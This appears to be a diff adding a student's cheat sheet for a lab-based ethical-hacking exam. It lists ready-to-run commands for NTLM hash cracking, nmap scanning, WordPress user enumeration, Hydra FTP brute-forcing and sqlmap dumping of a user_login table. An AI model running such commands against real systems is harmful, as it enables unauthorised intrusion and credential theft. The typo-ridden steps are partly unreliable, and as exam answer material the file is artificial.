@@ -1,0 +1,80 @@
+Rainbow crack
+
+This is the windows /ubuntu question, so we need to find the file credentialis-cloud.txt in some
+windows machine.
+Open the rainbow crack application by going into the Document folder and double click
+rcrack_gui.exe
+Click on file and select “ NTLM hashes from the pwdump file …”
+Then open dialog-box appears navigate to (credentials-Cloud.txt) and open OR
+Then you will go and select and open (Credentils-Cloud.txt) file on the same machine where the
+rainbow crack application is. OPEN
+The above-mentioned process will crack and give us the username in clear text
+Now on the same rainbow crack page where we have the usernames got to the 3rd tab”
+rainbow table” click and then click again on search rainbow table from the drop down
+menu.
+Open dialog button appears select the file from it with name mentioned in the lower
+command/next command.
+In the next window choose ntlm_loweralpha#4-6_0_2400x4000000_ox#000.rt and then click
+open
+The above-mentioned process will crack the username and password straight away in clear form.
+Now we need to take this cracked username and password and login to ubuntu server and find the
+required account no and tick the right answer
+
+
+
+Wireshark
+
+
+http.request.method==POST (This command will give the target packet which holds the
+username
+
+First open the Covert.pcapng file available on kali desktop
+Double click and open into the Wireshark in kali
+Enter “tcp” into the bar which will give us all tcp packets.
+Then click on each packet and find word underneath in 2
+nd columns.
+Then in answer sheet write the port no of both the machine who shared the secret message ---->covert tcp pcapng
+
+
+
+nmap
+
+nmap -p 3306 (target network) i.e 192.168.73.0/24 for (open port)
+nmap -A -T4 (ip address of the port 3306 open) i.e (192.168.73.170) -O
+nmap -p 3389 (target network) for example 192.168.73.0/24
+nmap -sV --script=banner www.silicon.ac.in
+ IP ADDRESS OF THE MACHINE EXAMPLE COMMAND IS
+UNDERNEATH . LOOK FOR MACJHINE OPEN WITH FTP PORT
+nmap -p 20,21 192.168.73.0/24
+
+
+
+
+wpscan
+
+wpscan (the target url address) I e --url “http://192.168.73.171” --enumerate u
+
+
+
+john
+
+john --format=md5 file.txt
+
+hydra -L user.txt -P pass.txt (the target ip address) i.e. 192.168.73.162 ftp (point to remember the
+user.txt pass.txt files will be given on the machine already)
+
+(ftp target ip i.e 192.168.73.162)----->login to ftp
+
+dir------>ls
+
+
+get ftp -flag.txt (this command will save the folder into our kali root folder)
+
+Sql map
+
+Sqlmap -u http://www.m.com/viewprofile.aspx?=6 --dbs --batch
+Sqlmap -u http://www.m.com/viewprofile.aspx?=6 -D goodshopping --tables --batch
+Sqlmap -u http://www.m.com/viewprofile.aspx?=6 -D goodshopping -T user_login
+--columns --batch
+Sqlmap -u http://www.m.com/viewprofile.aspx?=6 -D goodshopping -T user_login
+--dump --batch
